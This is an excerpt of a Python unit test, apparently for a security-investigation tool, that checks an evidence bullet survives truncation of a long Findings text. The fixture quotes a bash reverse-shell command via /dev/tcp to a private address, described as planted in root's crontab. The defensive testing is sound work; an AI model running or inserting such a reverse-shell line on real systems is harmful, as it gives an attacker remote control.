...
class GroundedOutputGuardTests(unittest.TestCase):
    def test_synthesis_preserves_findings_evidence_while_clipping(self):
        # Findings is now the system of record for grounded evidence. Put the
        # evidence bullet at the head so it survives the length clip applied to
        # the (long) Findings body.
        evidence = (
            "- Event evt-123456 shows root crontab inserted "
            "`/bin/bash -c bash -i >& /dev/tcp/10.0.2.5/4444 0>&1`."
        )
        filler_len = graph._MAX_SYNTHESIS_FINDINGS_CHARS + 50 - len(evidence) - 1
        findings = evidence + "\n" + ("A" * filler_len)
        summary = _answer(
            findings,
